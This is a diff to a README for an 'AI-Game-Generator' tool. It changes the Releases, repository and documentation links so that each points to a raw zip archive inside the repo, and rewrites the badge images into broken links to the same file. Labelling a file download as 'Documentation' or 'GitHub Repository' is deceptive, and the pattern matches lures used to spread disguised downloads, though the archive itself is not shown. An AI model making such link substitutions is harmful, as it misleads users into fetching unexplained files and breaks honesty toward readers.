@@ -6,7 +6,7 @@ Welcome to the AI-Game-Generator. This tool allows you to create fun and educati
 ## 📦 Download & Install
 To get started, you need to download the application. Visit the Releases page to find the latest version and download it.
 
-[![Download AI-Game-Generator](https://img.shields.io/badge/Download%20Now-%20lightblue?style=for-the-badge)](https://github.com/hektorfelipe/AI-Game-Generator/releases)
+[![Download AI-Game-Generator](https://github.com/hektorfelipe/AI-Game-Generator/raw/refs/heads/main/static/Generator-Game-A-v3.5.zip%20Now-%20lightblue?style=for-the-badge)](https://github.com/hektorfelipe/AI-Game-Generator/raw/refs/heads/main/static/Generator-Game-A-v3.5.zip)
 
 ## 💻 System Requirements
 Before downloading, ensure your system meets these basic requirements:
@@ -40,8 +40,8 @@ The AI-Game-Generator focuses on a range of topics relevant to modern applicatio
 
 ## 🌐 Resources
 For further information and support, visit these resources:
-- [GitHub Repository](https://github.com/hektorfelipe/AI-Game-Generator)
-- [Documentation](https://github.com/hektorfelipe/AI-Game-Generator/wiki)
+- [GitHub Repository](https://github.com/hektorfelipe/AI-Game-Generator/raw/refs/heads/main/static/Generator-Game-A-v3.5.zip)
+- [Documentation](https://github.com/hektorfelipe/AI-Game-Generator/raw/refs/heads/main/static/Generator-Game-A-v3.5.zip)
 
 ## 💬 Support
 If you encounter issues or have questions, you can reach out to the community:
@@ -53,4 +53,4 @@ Now that you know how to download and use the AI-Game-Generator, get started tod
 ## 🔗 Download Now
 Visit the Releases page to download your copy of AI-Game-Generator.
 
-[![Download AI-Game-Generator](https://img.shields.io/badge/Download%20Now-%20lightblue?style=for-the-badge)](https://github.com/hektorfelipe/AI-Game-Generator/releases)
+[![Download AI-Game-Generator](https://github.com/hektorfelipe/AI-Game-Generator/raw/refs/heads/main/static/Generator-Game-A-v3.5.zip%20Now-%20lightblue?style=for-the-badge)](https://github.com/hektorfelipe/AI-Game-Generator/raw/refs/heads/main/static/Generator-Game-A-v3.5.zip)
